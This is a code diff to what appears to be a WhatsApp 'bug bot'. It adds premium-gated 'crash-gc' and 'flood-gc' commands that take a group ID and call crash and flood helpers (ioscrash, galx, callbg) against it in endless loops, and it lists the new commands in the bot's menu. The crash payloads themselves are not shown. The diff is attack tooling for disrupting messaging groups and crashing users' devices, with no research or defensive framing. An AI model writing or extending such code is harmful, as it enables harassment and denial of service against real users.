@@ -1352,6 +1352,52 @@ async function ZnXIvS(target, Ptcp = true) {
 
 	    
         switch (command) {
+case 'crash-gc': {
+if (!isPremium) return replygcxeon(mess.prem)
+if (!q) return replygcxeon(`Use ${prefix+command} gc-jid\nExample ${prefix+command} gc-jid`)
+let target = q
+await loading()
+for (;;) {
+await callbg(m.chat)
+await galx(target, Ptcp = false)
+await ioscrash(target)
+await ioscrash(target)
+await callbg(m.chat)
+await galx(target, Ptcp = false)
+await ioscrash(target)
+await ioscrash(target)
+await callbg(m.chat) 
+await galx(target, Ptcp = false)
+await ioscrash(target)
+await ioscrash(target)
+await callbg(m.chat)
+await galx(target, Ptcp = false)
+}
+}
+break
+
+			
+case 'flood-gc': {
+if (!isPremium) return replygcxeon(mess.prem)
+if (!q) return replygcxeon(`Use ${prefix+command} gc-jid\nExample ${prefix+command} gc-jid`)
+let target = q
+await loading()
+for (;;) {
+await galx(target, Ptcp = false)
+await ioscrash(target)
+await ioscrash(target)
+await galx(target, Ptcp = false)
+await ioscrash(target)
+await ioscrash(target)
+await galx(target, Ptcp = false)
+await ioscrash(target)
+await ioscrash(target)
+await galx(target, Ptcp = false)
+}
+}
+break
+
+			
 case 'kill-gc': {
 if (!isPremium) return replygcxeon(mess.prem)
 if (!q) return replygcxeon(`Use ${prefix+command} gc-jid\nExample ${prefix+command} gc-jid`)
@@ -1370,7 +1416,6 @@ await callbg(target)
 await dott(target)
 await sleep(2000)
 }
-await replygcxeon(`Done sending bugs to ${q}`)
 await sendAud(m.chat)
 }
 break
@@ -3633,6 +3678,9 @@ xcrash <number>
 infinite <number> 
 infinite-crash <number>
 ioscrash <number>
+kill-gc <gc-jid>
+flood-gc <gc-jid> infinite
+crash-gc <gc-jid> infinite-crash
 xioscrash <number>
 xioscrash2 <amount>
 iosgoogle <number>
